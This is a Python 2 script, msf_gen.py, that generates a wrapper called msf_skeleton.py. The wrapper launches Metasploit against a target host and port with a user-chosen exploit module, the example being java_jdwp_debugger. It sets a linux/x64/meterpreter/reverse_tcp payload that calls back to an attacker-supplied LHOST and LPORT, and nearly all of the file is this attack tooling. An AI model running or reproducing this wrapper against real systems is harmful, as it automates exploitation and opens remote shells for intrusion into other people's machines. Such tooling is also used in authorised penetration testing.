#!/usr/bin/env python2
#  -*- coding: utf-8 -*- ####################################################################################
#╔╦╗╔═╗╔═╗  ╔═╗╔═╗╔╗╔                                                                                       #
#║║║╚═╗╠╣   ║ ╦║╣ ║║║                                                                                       #
#╩ ╩╚═╝╚────╚═╝╚═╝╝╚╝                                                                                       #
#                                                                                                           #
# msf_gen.py - mikael.kall@kindredgroup.com                                                                 #
#                                                                                                           #
# DATE                                                                                                      #
# 06/12/2018                                                                                                #
#                                                                                                           #
# DESCRIPTION                                                                                               #
# Outputs msf skeleton wrapper                                                                              #
#                                                                                                           #
# Mikael Kall - nighter@nighter.se                                                                          #
#                                                                                                           #
#############################################################################################################

import signal
import sys
import os

# Handler to exist cleanly on ctrl+C
def signal_handler(signal, frame):
    print "\nYou pressed Ctrl+C!"
    sys.exit()
signal.signal(signal.SIGINT, signal_handler)


def generate_exploit(command):

    _exploit = """#!/usr/bin/env python2
#  -*- coding: utf-8 -*- ####################################################################################
# msf_skeleton.py                                                                                           #
#                                                                                                           #
# DESCRIPTION                                                                                               #
# Auto generated by msf_gen.py                                                                              #
#                                                                                                           #
#############################################################################################################

import signal
import sys
import os

# Handler to exist cleanly on ctrl+C
def signal_handler(signal, frame):
    print("\\nYou pressed Ctrl+C!")
    sys.exit()
signal.signal(signal.SIGINT, signal_handler)

def exploit():

   command = \"\"\"msfconsole -x \""""+command+""";set RHOST %s;set RPORT %s;set PAYLOAD linux/x64/meterpreter/reverse_tcp;set LHOST %s;set LPORT %s;run\" \"\"\" % (HOST, PORT, LHOST, LPORT)
   os.system(command)

def print_usage():
   print (\"\"\"msf_skeleton.py\"\"\")

   print("Usage: %s <HOST>:<PORT> <LHOST> <LPORT>" % (sys.argv[0]))
   print("EXAMPLE: msf_skeleton.py '127.0.0.1:5005' 10.100.12.xx 1337\\n")
   sys.exit(0)

if __name__ == '__main__':

    if len(sys.argv) != 4:
       print_usage()

    HOST = sys.argv[1]
    if ':' in HOST:
      (HOST, PORT) = HOST.split(':')
    else:
      PORT = '80'

    LHOST = sys.argv[2]
    LPORT = sys.argv[3]

    if os.path.isfile('/usr/bin/msfconsole') is False:
       print('ERROR: Please install metasploit for run this PoC.')
       sys.exit(1)

    exploit()
"""

    with open('msf_skeleton.py','w') as file:
        file.writelines(_exploit)

    print("generated: msf_skeleton.py")

def print_usage():
    print("""
╔╦╗╔═╗╔═╗  ╔═╗╔═╗╔╗╔
║║║╚═╗╠╣   ║ ╦║╣ ║║║
╩ ╩╚═╝╚────╚═╝╚═╝╝╚╝
Outputs msf skeleton wrapper
[nighter@nighter.se]
    """)
    print("Usage: %s <msf exploit>" % (sys.argv[0]))
    print("EXAMPLE: msf_gen exploit/multi/misc/java_jdwp_debugger\n")
    sys.exit(0)


if __name__ == '__main__':

    if len(sys.argv) != 2:
        print_usage()

    command = sys.argv[1]
    generate_exploit(command)
